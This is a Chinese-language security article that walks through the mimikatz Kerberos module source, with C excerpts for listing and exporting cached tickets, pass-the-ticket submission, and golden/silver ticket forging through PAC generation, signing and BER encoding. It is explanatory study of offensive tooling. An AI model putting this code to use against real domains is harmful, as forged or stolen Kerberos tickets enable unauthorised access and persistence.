# mimikatz源码学习-Kerberos模块

阅读量 **425603**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-12 15:30:58

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t019e3fba1a98d25384.jpg)

> mimikatz是内网渗透中的一大利器，本文主要讨论学习mimikatz中与Kerberos协议相关的代码

mimikatz的Kerberos模块中常用大概为：

1、 `kerberos::list` ：列出当前的所有票据（当前用户所在session，效果等同于命令`klist`）  
2、`kerberos::ptt` ：Pass The Ticket，即票据传递  
3、`kerberos::golden` ：伪造票据，如黄金票据、白银票据

## LsaCallKerberosPackage

`LsaCallKerberosPackage`是`ntsecapi.h`下的一个API，MSDN对它的描述如下：

> The LsaCallAuthenticationPackage function is used by a logon application to
> communicate with an authentication package.  
>  This function is typically used to access services provided by the
> authentication package.

大意为这个函数用作登录程序和身份认证包通信，但通常被用来访问身份认证包提供的服务。在mimikatz的源码中列出票据和票据传递两个功能模块都围绕这个函数展开，通过传递不同的参数得到不同的执行结果。

函数原型如下：

    
    
    NTSTATUS LsaCallAuthenticationPackage(
      HANDLE    LsaHandle, 
      ULONG     AuthenticationPackage, // 提供身份认证的标识符
      PVOID     ProtocolSubmitBuffer, // 用于传递给身份验证包的缓冲区
      ULONG     SubmitBufferLength,
      PVOID     *ProtocolReturnBuffer, // 接收从验证包返回的数据的缓冲区
      PULONG    ReturnBufferLength,
      PNTSTATUS ProtocolStatus
    );
    

###  列出票据

mimikatz的源码中这个功能对应的代码比较简单，只是调用了`LsaCallAuthenticationPackage`，然后对返回的数据进行解析：

    
    
    status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID *) &pKerbCacheResponse, &szData, &packageStatus);
      if(NT_SUCCESS(status))
      {
        if(NT_SUCCESS(packageStatus))
        {
          for(i = 0; i < pKerbCacheResponse->CountOfTickets; i++)
          {
            kprintf(L"\n[%08x] - 0x%08x - %s", i, pKerbCacheResponse->Tickets[i].EncryptionType, kuhl_m_kerberos_ticket_etype (pKerbCacheResponse->Tickets[i].EncryptionType));
            kprintf(L"\n   Start/End/MaxRenew: ");
            kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].StartTime); kprintf(L" ; ");
            kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].EndTime); kprintf(L" ; ");
            kull_m_string_displayLocalFileTime((PFILETIME) &pKerbCacheResponse->Tickets[i].RenewTime);
            kprintf(L"\n   Server Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ServerName, &pKerbCacheResponse->Tickets[i]. ServerRealm);
            kprintf(L"\n   Client Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ClientName, &pKerbCacheResponse->Tickets[i]. ClientRealm);
            kprintf(L"\n   Flags %08x    : ", pKerbCacheResponse->Tickets[i].TicketFlags);
            kuhl_m_kerberos_ticket_displayFlags(pKerbCacheResponse->Tickets[i].TicketFlags);
    

注意到，mimikatz使用`LsaCallKerberosPackage`对`LsaCallAuthenticationPackage`做了简要封装，实际上省去了前两个参数，前两个参数被当作全局变量在初始化时完成赋值，所以这里我们只需要关注函数执行之后返回的数据，代码中对应为变量`pKerbCacheResponse`，变量对应的结构体在MSDN中描述如下：

    
    
    typedef struct _KERB_QUERY_TKT_CACHE_RESPONSE {
      KERB_PROTOCOL_MESSAGE_TYPE MessageType;
      ULONG                      CountOfTickets;  // 数组Tickets中的票据数量
      KERB_TICKET_CACHE_INFO     Tickets[ANYSIZE_ARRAY]; 
    } KERB_QUERY_TKT_CACHE_RESPONSE, *PKERB_QUERY_TKT_CACHE_RESPONSE;
    

其中，结构体`KERB_TICKET_CACHE_INFO`描述如下，用来描述缓存的Kerberos票据相关信息：

    
    
    typedef struct _KERB_TICKET_CACHE_INFO {
      UNICODE_STRING ServerName;
      UNICODE_STRING RealmName;
      LARGE_INTEGER  StartTime;
      LARGE_INTEGER  EndTime;
      LARGE_INTEGER  RenewTime;
      LONG           EncryptionType;
      ULONG          TicketFlags;
    } KERB_TICKET_CACHE_INFO, *PKERB_TICKET_CACHE_INFO;
    

导出票据时同样是调用这个API，只是这时我们需要关注用于传递请求的参数，即`LsaCallAuthenticationPackage`的第三个参数`ProtocolSubmitBuffer`，对应的结构体在MSDN中描述为：

    
    
    typedef struct _KERB_RETRIEVE_TKT_REQUEST {
      KERB_PROTOCOL_MESSAGE_TYPE MessageType;
      LUID                       LogonId;
      UNICODE_STRING             TargetName; // 目标服务名
      ULONG                      TicketFlags; // 用于标记票据用途
      ULONG                      CacheOptions; // 搜索缓存的选项，KERB_RETRIEVE_TICKET_AS_KERB_CRED表示以Keberos凭证的形式返回票据
      LONG                       EncryptionType;
      SecHandle                  CredentialsHandle;
    } KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;
    

对应的，用于接收请求的票据用结构体`_KERB_RETRIEVE_TKT_RESPONSE`描述，该结构体只包含一个成员结构体`KERB_EXTERNAL_TICKET`，而这个结构体的成员`EncodedTicketSize`和`EncodedTicket`分别为返回的票据大小和票据内容。

其实不难发现，仅需要查询缓存中的票据时，使用结构体`KERB_QUERY_TKT_CACHE_REQUEST`和`KERB_QUERY_TKT_CACHE_RESPONSE`并且用于请求的结构体变量置零即可；但是想要获取票据内容时就需要使用结构体`KERB_RETRIEVE_TKT_REQUEST`和`KERB_RETRIEVE_TKT_RESPONSE`了，与查询不同，获取票据内容时需要在请求中指明请求的类型（`MessageType`）、搜索缓存的选项（`CacheOptions`）、票据标志（`TicketFlags`）、目标服务名（`TargetName`）。

不过需要注意的是，结构体成员中`UNICODE_STRING`对应的是结构体类型，其定义如下：

    
    
    typedef struct _UNICODE_STRING {
      USHORT Length;
      USHORT MaximumLength;
      PWSTR  Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;
    

所以，对`TargetName`赋值时，需要单独的一块空间存放Buffer对应的值，mimikatz的处理如下：

    
    
    szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
    if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
    ...
    ...
    ...
    pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);
    

此处的思路是header+content，这样做可以保证数据在同一块内存中，避免申请多块内存。

至此，其实列出缓存中的票据以及导出票据的分析已经结束，但是我们还忽略了两个参数，即在mimikatz中以全局变量的形式传入的句柄和身份认证包标识。MSDN的句柄`LsaHandle`的描述为从与调用函数
`LsaRegisterLogonProcess` 或
`LsaConnectUntrusted`获得，而身份认证包标识是从函数`LsaLookupAuthenticationPackage`中获取，mimikatz中的代码也确实如此：

    
    
    NTSTATUS status = LsaConnectUntrusted(&g_hLSA);
      if(NT_SUCCESS(status))
      {
        status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
        g_isAuthPackageKerberos = NT_SUCCESS(status);
    

其中，`kerberosPackageName`为结构体`LSA_STRING`类型的变量，赋值为`MICROSOFT_KERBEROS_NAME_A`，指定为ANSI版本的Kerberos身份认证包名称。

如果要清空缓存，就需要用到结构体`_KERB_PURGE_TKT_CACHE_REQUEST`了，它描述了想要删除的缓存票据的信息，在MSDN中的定义如下：

    
    
    typedef struct _KERB_PURGE_TKT_CACHE_REQUEST {
      KERB_PROTOCOL_MESSAGE_TYPE MessageType;
      LUID                       LogonId;
      UNICODE_STRING             ServerName;
      UNICODE_STRING             RealmName;
    } KERB_PURGE_TKT_CACHE_REQUEST, *PKERB_PURGE_TKT_CACHE_REQUEST;
    

其中需要注意的是第一个成员（`MessageType`)， **必须** 设置为`KerbPurgeTicketCacheMessage`。

###  票据传递

票据传递部分同样是使用`LsaCallAuthenticationPackage`，只不过这次使用的结构体是`KERB_SUBMIT_TKT_REQUEST`，在`NTSecAPI.h`中对该结构体的定义如下：

    
    
    typedef struct _KERB_SUBMIT_TKT_REQUEST {
        KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        LUID LogonId;
        ULONG Flags;
        KERB_CRYPTO_KEY32 Key; // key to decrypt KERB_CRED
        ULONG KerbCredSize;
        ULONG KerbCredOffset;
    } KERB_SUBMIT_TKT_REQUEST, *PKERB_SUBMIT_TKT_REQUEST;
    

关于这个结构体的描述在MSDN中似乎没有发现，不过根据其他结构体和字段的命名不难猜测相应字段的含义。对比mimikatz源码来看其实只需要设置三部分内容，一是`MessageType`，这里需要设置为固定内容：`KerbSubmitTicketMessage`；剩下的两部分内容即票据对应的大小和位置（因为票据数据是追加在结构体后的，所以这里偏移是结构体的大小），设置完之后调用函数`LsaCallAuthenticationPackage`即可完成票据传递：

    
    
    submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
    if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
    {
      pKerbSubmit->MessageType = KerbSubmitTicketMessage;
      pKerbSubmit->KerbCredSize = dataSize;
      pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
      RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, data, dataSize);
    
      status = LsaCallKerberosPackage(pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
    

## 伪造票据

mimikatz中描述票据的结构体定义如下：

    
    
    typedef struct _KIWI_KERBEROS_TICKET {
      PKERB_EXTERNAL_NAME  ServiceName;
      LSA_UNICODE_STRING   DomainName;
      PKERB_EXTERNAL_NAME  TargetName;
      LSA_UNICODE_STRING   TargetDomainName;
      PKERB_EXTERNAL_NAME  ClientName;
      LSA_UNICODE_STRING   AltTargetDomainName;
    
      LSA_UNICODE_STRING Description;
    
      FILETIME StartTime;
      FILETIME EndTime;
      FILETIME RenewUntil;
    
      LONG  KeyType;
      KIWI_KERBEROS_BUFFER  Key;
    
      ULONG  TicketFlags;
      LONG   TicketEncType;
      ULONG  TicketKvno;
      KIWI_KERBEROS_BUFFER  Ticket;
    } KIWI_KERBEROS_TICKET, *PKIWI_KERBEROS_TICKET;
    

从结构体定义其实可以看出ticket所包含的内容，在Kerberos认证中,以AS-REP为例，我们知道AS返回给用户两部分内容:
一是TGT,二是使用用户密码hash加密的session key。其中，TGT包含了session
key（登录会话密匙）、失效时间以及pac信息（特权属性证书）等内容，不过在mimikatz中pac信息是单独生成的，所以上述的结构体定义中并不包含这部分内容。

从生成票据的代码流程来看，生成TGT和TGS的代码基本一致，最后会生成哪种票据取决于传递的参数，比如TGT需要krbtgt的哈希而TGS需要请求的服务。代码中生成票据的代码主要是函数`kuhl_m_kerberos_golden_data`，首先根据传入的参数完成上述定义的ticket结构体的初始化，然后根据是否传入sid来决定是否生成签名的pac：

    
    
    if(sid) // we want a PAC !
    {
      if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
      {
        if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
        {
          kprintf(L" * PAC generated\n");
          status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
          if(NT_SUCCESS(status))
            kprintf(L" * PAC signed\n");
        }
      }
    }
    

随后就是生成对应的ticket，详细来讲就是先按照固定格式生成要加密的内容，然后对这部分内容加密，最后返回加密的结果。对于加密部分，围绕一个重要函数：`CDLocateCSystem`，他第二个参数传入的是结构体，这个结构体包含了指向加解密函数的指针等信息，定义如下：

    
    
    typedef struct _KERB_ECRYPT {
      ULONG EncryptionType;
      ULONG BlockSize;
      ULONG ExportableEncryptionType;
      ULONG KeySize;
      ULONG HeaderSize;
      ULONG PreferredCheckSum;
      ULONG Attributes;
      PCWSTR Name;
      PKERB_ECRYPT_INITIALIZE Initialize;
      PKERB_ECRYPT_ENCRYPT Encrypt;
      PKERB_ECRYPT_DECRYPT Decrypt;
      PKERB_ECRYPT_FINISH Finish;
      union {
        PKERB_ECRYPT_HASHPASSWORD_NT5 HashPassword_NT5;
        PKERB_ECRYPT_HASHPASSWORD_NT6 HashPassword_NT6;
      };
      PKERB_ECRYPT_RANDOMKEY RandomKey;
      PKERB_ECRYPT_CONTROL Control;
      PVOID unk0_null;
      PVOID unk1_null;
      PVOID unk2_null;
    } KERB_ECRYPT, *PKERB_ECRYPT;
    

`CDLocateCSystem`是Windows的一个API，位于`cryptdll.dll`，但粗略的搜索了一下并没有相关说明，似乎微软并未公开它，不过根据上述结构体以及dll文件，可以大概分析猜测这个api的作用。`cryptdll.dll`这个文件的导出函数并不多，而且可以大概猜测函数可能的功能：

![](https://p5.ssl.qhimg.com/t0110be551caa4d48d5.png)

导入上述定义的结构体，查看`CDLocateCSystem`对应的伪代码，发现这个函数其实就是通过传入的type从链表中寻找对应的块：

![](https://p0.ssl.qhimg.com/t01f491da5dfb633813.png)

再接着跟一下变量`cCSystems`,
可以发现只有以后函数对这个变量有赋值操作，跟到函数`CDRegisterCSystem`，发现这个函数实际上是通过传入的参数对变量赋值：

![](https://p5.ssl.qhimg.com/t0171880cd64fba288d.png)

再看这个函数的调用处，发现注册了一系列的密码算法:

![](https://p2.ssl.qhimg.com/t01734aa7ba13cf32fd.png)

继续分析可以发现`LibAttach`在DllMain中被调用，也就是说这个dll文件一被加载，就会注册各种密码学算法，供相关API使用，所以代码中调用`CDLocateCSystem`的目的是根据传入的`eType`获取一个用于`eType`对应类型的密码算法的实现，进而完成相应的加密或解密操作。根据结构体的成员定义以及`mimikatz`中相关的加密代码，可以猜测`cryptdll`中注册的密码学算法，使用方法基本一致，主要有一下流程：

  1. 通过`CDLocateCSystem`获取对应的结构体数据。
  2. 初始化操作（包括设置密钥、加解密数据大小等）。
  3. 加解密操作。
  4. 销毁相关环境。

回到正题，生成加密的ticket信息后，“格式化”票据信息生成票据，然后将票据写入缓存或者文件。

整个票据的生成流程大致如上所述，不过整个过程忽略了两个地方：一是PAC是如何生成的；二是加密票据前后调用的两个函数`kuhl_m_kerberos_ticket_createAppEncTicketPart`和`kuhl_m_kerberos_ticket_createAppKrbCred`。

###  PAC生成流程

PAC生成大体上分三个部分，也分别对应三个函数：

1、生成验证信息：kuhl_m_pac_infoToValidationInfo  
2、生成PAC：kuhl_m_pac_validationInfo_to_PAC  
3、PAC签名：kuhl_m_pac_signature

对于第一部分，可以透过结构体`PKERB_VALIDATION_INFO`来分析生成验证信息需要的内容，结构体的定义如下：

    
    
    typedef struct _KERB_VALIDATION_INFO {
      FILETIME LogonTime;
      FILETIME LogoffTime;
      FILETIME KickOffTime;
      FILETIME PasswordLastSet;
      FILETIME PasswordCanChange;
      FILETIME PasswordMustChange;
      RPC_UNICODE_STRING EffectiveName;
      RPC_UNICODE_STRING FullName;
      RPC_UNICODE_STRING LogonScript;
      RPC_UNICODE_STRING ProfilePath;
      RPC_UNICODE_STRING HomeDirectory;
      RPC_UNICODE_STRING HomeDirectoryDrive;
      USHORT LogonCount;
      USHORT BadPasswordCount;
      ULONG UserId;
      ULONG PrimaryGroupId;
      ULONG GroupCount;
      /* [size_is] */ PGROUP_MEMBERSHIP GroupIds;
      ULONG UserFlags;
      USER_SESSION_KEY UserSessionKey;
      RPC_UNICODE_STRING LogonServer;
      RPC_UNICODE_STRING LogonDomainName;
      PISID LogonDomainId;
      ULONG Reserved1[ 2 ];
      ULONG UserAccountControl;
      ULONG SubAuthStatus;
      FILETIME LastSuccessfulILogon;
      FILETIME LastFailedILogon;
      ULONG FailedILogonCount;
      ULONG Reserved3;
      ULONG SidCount;
      /* [size_is] */ PKERB_SID_AND_ATTRIBUTES ExtraSids;
      PISID ResourceGroupDomainSid;
      ULONG ResourceGroupCount;
      /* [size_is] */ PGROUP_MEMBERSHIP ResourceGroupIds;
    } KERB_VALIDATION_INFO, *PKERB_VALIDATION_INFO;
    

关于结构体中的几个和时间相关的成员，其实只需要关注`LogonTime`，它由传入的结构体变量`lifeTimeData`中的`TicketStart`成员赋值，后者的数据内容通过`GetSystemTimeAsFileTime`获得，这个msdn对这个API的解释为：获取当前系统的时间。当然，最后赋值给`LogonTime`的值是处理之后的值。而对于剩余的和时间相关的成员，统一赋值为0x7fffffffffffffffll。

    
    
    GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
    *(PULONGLONG) &lifeTimeData.TicketStart -= *(PULONGLONG) &lifeTimeData.TicketStart % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
    

此外，`UserId`、`GroupIds`、`GroupCount`等成员实际上是从命令行参数获得，但通常情况下生成票据我们似乎并没有用到这些参数，所以传入的值实际上是NULL。  
获取到验证信息之后，就根据这些信息生成APC，PAC的总体结构如下：

![](https://p2.ssl.qhimg.com/t01a7a7a9c03b4b2d4c.png)

关于PAC结构的代码如下：

    
    
    (*pacType)->cBuffers = n;
    (*pacType)->Version = 0;
    
    (*pacType)->Buffers[0].cbBufferSize = szLogonInfo;
    (*pacType)->Buffers[0].ulType = PACINFO_TYPE_LOGON_INFO;
    (*pacType)->Buffers[0].Offset = offsetData;
    RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[0].Offset, pLogonInfo, (*pacType)->Buffers[0].cbBufferSize);
    
    (*pacType)->Buffers[1].cbBufferSize = szClientInfo;
    (*pacType)->Buffers[1].ulType = PACINFO_TYPE_CNAME_TINFO;
    (*pacType)->Buffers[1].Offset = (*pacType)->Buffers[0].Offset + szLogonInfoAligned;
    RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[1].Offset, pClientInfo, (*pacType)->Buffers[1].cbBufferSize);
    
    if(szClaimsAligned)
    {
      (*pacType)->Buffers[2].cbBufferSize = szClaims;
      (*pacType)->Buffers[2].ulType = PACINFO_TYPE_CLIENT_CLAIMS;
      (*pacType)->Buffers[2].Offset = (*pacType)->Buffers[1].Offset + szClientInfoAligned;
      RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[2].Offset, pClaims, (*pacType)->Buffers[2].cbBufferSize);
    }
    
    (*pacType)->Buffers[n - 2].cbBufferSize = szSignature;
    (*pacType)->Buffers[n - 2].ulType = PACINFO_TYPE_CHECKSUM_SRV;
    (*pacType)->Buffers[n - 2].Offset = (*pacType)->Buffers[n - 3].Offset + SIZE_ALIGN((*pacType)->Buffers[n - 3].cbBufferSize, 8);
    RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[n - 2].Offset, &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));
    
    (*pacType)->Buffers[n - 1].cbBufferSize = szSignature;
    (*pacType)->Buffers[n - 1].ulType = PACINFO_TYPE_CHECKSUM_KDC;
    (*pacType)->Buffers[n - 1].Offset = (*pacType)->Buffers[n - 2].Offset + szSignatureAligned;
    RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[n - 1].Offset, &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));
    

其中，第一部分（`pLogonInfo`）即对`kuhl_m_pac_infoToValidationInfo`的结果进行加密操作后的内容，这里加密实际上是调用的`kull_m_rpc_Generic_Encode`，不过实际上最后的加密调用了`NdrMesTypeEncode2`，它是[midles.h](https://docs.microsoft.com/en-us/windows/win32/api/midles/)下的一个函数。

关于客户端信息（`ClientInfo`），首先需要明确的是这部分内容是明文信息，主要内容为用户名。Cliams其实也是加密的数据，是否包含这部分内容取决于是否传入参数`Claims`，显然通常情况下我们并没有传入这一项，所以这里不再继续跟进。

至此，PAC的主体已经说明结束，剩余两部分保存的是主体部分的校验和。计算校验和使用的是`CDLocateCheckSum`，这个API来自`cryptdll.dll`，用法和`CDLocateCSystem`类似。

###  两个函数

其实`kuhl_m_kerberos_ticket_createAppEncTicketPart`和`kuhl_m_kerberos_ticket_createAppKrbCred`都是围绕两个结构体展开的即：

    
    
    typedef struct berElement {
      UNICODE PTCHAR opaque; 
    } BerElement;
    
    typedef struct berval {
      ULONG bv_len;
      UNICODE PTCHAR bv_val;
    } LDAP_BERVAL, *PLDAP_BERVAL, BERVAL, *PBERVAL;
    

涉及到这两个结构体的函数位于[winber.h](https://docs.microsoft.com/en-us/windows/win32/api/winber/)，不过对于前面提到的两个函数，我们们只需要关注两个函数：

1、`ber_printf`，顾名思义，其实就是用来格式化数据的，mimikatz中的`kull_m_asn1_GenTime`其实也是对该函数的封装  
2、`ber_flatten`，MSDN的解释是从BerElement结构中获取数据保存到一个berval结构中，换句话说其实也就是对数据的进一步“格式化”

> 关于头文件`winber.h`，其实MSDN上也说明了是用于LDAP的，因为AD域是基于LDAP的，所以这里对数据的一些“格式化”操作也是事出有因。  
>  此外，使用这个头文件时还需引入`windows.h`和`winldap.h`，并且添加依赖项：`wldap32.lib`(`#pragma
> comment(lib,"wldap32.lib")`)

当然，分析这两个函数的主要目的并不它实现了什么样的功能，而是透过这个功能（对数据“格式化”）得知票据的加密部分的内容构成，以及最后得到的票据内容构成。  
首先看加密部分的内容构成，其实从函数传入的参数来看，这部分应该包含了整个票据的所有信息，因为函数`kuhl_m_kerberos_ticket_createAppEncTicketPart`获取的参数是记录票据信息的结构体数据和pac信息，查看函数的实现部分其实和猜想大差不差：按照固定的顺序将域名、用户名、生成/失效时间等信息通过`ber_printf`写入到`BerElement`类型的变量随后通过`ber_flatten`得到最终需要加密的数据格式（存储到结构体`berval`类型的变量中），并返回给调用者。

透过mimikatz的代码，其实可以看出要加密的内容大体的格式：

    
    
    ber_printf(pBer, "t{{t{", MAKE_APP_TAG(ID_APP_ENCTICKETPART), MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_FLAGS));
    kull_m_asn1_BitStringFromULONG(pBer, ticket->TicketFlags);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_KEY));
    kuhl_m_kerberos_ticket_createSequenceEncryptionKey(pBer, ticket->KeyType, ticket->Key.Value, ticket->Key.Length);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CREALM));
    kull_m_asn1_GenString(pBer, &ticket->AltTargetDomainName);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CNAME));
    kuhl_m_kerberos_ticket_createSequencePrimaryName(pBer, ticket->ClientName);
    ber_printf(pBer, "}t{{t{i}t{o}}}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_TRANSITED), MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_TR_TYPE), 0, MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_CONTENTS), NULL, 0, MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHTIME));
    kull_m_asn1_GenTime(pBer, &ticket->StartTime);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_STARTTIME));
    kull_m_asn1_GenTime(pBer, &ticket->StartTime);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_ENDTIME));
    kull_m_asn1_GenTime(pBer, &ticket->EndTime);
    ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_RENEW_TILL));
    kull_m_asn1_GenTime(pBer, &ticket->RenewUntil);
    ber_printf(pBer, "}"); /* ID_CTX_ENCTICKETPART_CADDR not present */
    if(PacAuthData && PacAuthDataSize)
    {
      ber_printf(pBer, "t{{{t{i}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA), MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_IF_RELEVANT, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA));
      if(pBerPac = ber_alloc_t(LBER_USE_DER))
      {
        ber_printf(pBerPac, "{{t{i}t{o}}}", MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_WIN2K_PAC, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA), PacAuthData, PacAuthDataSize);
        if(ber_flatten(pBerPac, &pBerValPac) >= 0)
          ber_printf(pBer, "o", pBerValPac->bv_val, pBerValPac->bv_len);
        ber_free(pBerPac, 1);
      }
      ber_printf(pBer, "}}}}");
    }
    ber_printf(pBer, "}}");
    

这里值得注意的是PAC信息是作为一个可选项加入到要加密内容的尾部的，而是否包含PAC信息取决于生成票据时是否传入SID。对于最后载入缓存或写入文件的内容，即`kuhl_m_kerberos_ticket_createAppKrbCred`的返回值也是通过同样的形式构造数据，最后调用`ber_flatten`生成`berval`结构的数据。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **落花流水鸭** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/257703](/post/id/257703)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Mimikatz](/tag/Mimikatz)
  * [kerberos](/tag/kerberos)

 **+1** __3赞

 __收藏

![](https://p3.ssl.qhimg.com/t0175eac96d8a826ad7.png) 落花流水鸭

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

